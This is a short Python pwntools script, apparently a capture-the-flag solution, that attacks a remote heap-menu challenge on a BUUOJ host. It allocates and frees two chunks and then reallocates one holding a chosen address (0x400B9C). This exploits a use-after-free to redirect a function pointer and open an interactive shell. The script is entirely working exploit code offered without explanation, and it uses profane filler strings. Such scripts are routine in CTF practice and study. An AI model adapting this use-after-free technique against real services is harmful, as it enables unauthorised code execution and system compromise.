from pwn import *

r = remote('node3.buuoj.cn',26046)

def add(size,name):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Her name size is :')
	r.sendline(str(size))
	r.recvuntil('Her name is :')
	r.sendline(name)

def free(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index :')
	r.sendline(str(index))

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Index :')
	r.sendline(str(index))

add(0x60,'fuck')
add(0x60,'fuck')
free(0)
free(1)
add(0x10,p64(0x400B9C))
show(0)
r.interactive()
